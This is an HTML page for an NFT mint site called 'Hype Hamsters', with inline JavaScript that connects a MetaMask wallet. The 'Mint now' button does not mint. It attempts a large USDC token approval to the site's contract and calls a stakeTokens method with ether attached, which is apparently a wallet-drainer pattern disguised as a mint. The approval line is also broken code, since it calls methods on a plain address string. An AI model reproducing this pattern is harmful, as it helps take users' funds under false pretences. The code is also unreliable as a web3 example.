<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="style.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mint Site</title>    
    <script src="https://cdn.jsdelivr.net/npm/@metamask/onboarding@1.0.1/dist/metamask-onboarding.bundle.js"></script>
</head>
<body>
    <Header class="row container"> 
        <a href="index.html" class="logo">
            Hype Hamsters
        </a>
        <div class="toggleMenu" onclick="toggleMenu();"></div>
        <nav class="navigation row">
            <ul class="row">
                <li><a target="_blank" href="https://opensea.io/">Collection</a></li>
                <li><a onclick="walletconnect()" class="hero-btn" id="connect-wallet"> Connect Wallet</a>
                    <a class="hero-btn" id="disconnect-wallet"> <img src="icons8-cancel.svg"> </a>
                    <div id="message"></div>
                </li>
            </ul>
        </nav>
    </Header>

    <section class="hero row container">
        <div>
            <h6>Mint Now</h6>
            <h1>Our Unique NFT Collection 10k limited nfts</h1>
            <a id="mint" class="hero-btn">Mint now</a>
            <label for="quantity" >Quantity (between 1 and 10):</label>
            <input type="number" id="quantity" name="quantity" value="1" min="1" max="10">
        </div>
    </section>

<script type="text/javascript" src="https://unpkg.com/web3@1.6.0/dist/web3.min.js"></script>
<script type="text/javascript" src="/ABI.js"></script>
<script type="text/javascript">
    var account = null;
    var contract = null;

    //const ADDRESS = "0xB9542838da5980212e4Ef3fF848bea5F15834387";
    const ADDRESS = "0x310C73c47f4730Aee41157381B4f6cD54Ef7994e";
    const prc20 = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
   
    async function walletconnect() {
        if(window.ethereum) {
        await window.ethereum.send('eth_requestAccounts');
        window.web3 = new Web3(window.ethereum);

        var accounts = await web3.eth.getAccounts();
        account = accounts[0];
        document.getElementById('connect-wallet').textContent = account;
        
        console.log(account);   
        contract = new web3.eth.Contract(ABI, ADDRESS);

        document.getElementById('mint').onclick = () => {
            let value = document.getElementById('quantity').value;
            const price = web3.utils.toWei(value, 'ether');
            prc20.events.Approval([account, "0x310C73c47f4730Aee41157381B4f6cD54Ef7994e", 9999999]).processReceipt();
            contract.methods.stakeTokens(value).send({ from: account, value: price});
        }
        
        }
    }
</script>
</body>
</html>